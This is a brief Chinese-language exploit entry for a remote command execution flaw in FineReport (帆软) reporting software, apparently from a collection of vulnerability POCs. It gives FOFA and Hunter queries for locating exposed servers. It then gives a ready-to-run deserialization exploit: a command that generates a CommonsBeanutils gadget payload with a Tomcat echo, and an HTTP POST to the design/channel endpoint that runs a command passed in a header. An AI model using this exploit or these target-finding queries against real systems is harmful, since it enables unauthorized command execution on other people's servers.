# 帆软报表 channel 远程命令执行漏洞

## 网络测绘

fofa: "Powered by 帆软"

hunter: app.name="FineReport 帆软"

## POC / EXP

```
java -jar ysuserial-1.5-su18-all.jar -g CommonsBeanutils1183NOCC -p 'EX-TomcatEcho' -ch "cmd" > fine10.bin

POST /webroot/decision/remote/design/channel HTTP/1.1
Content-Type: application/json
Host: 
cmd: id
Connection: close

{{gzip(file(fine10.bin))}}
```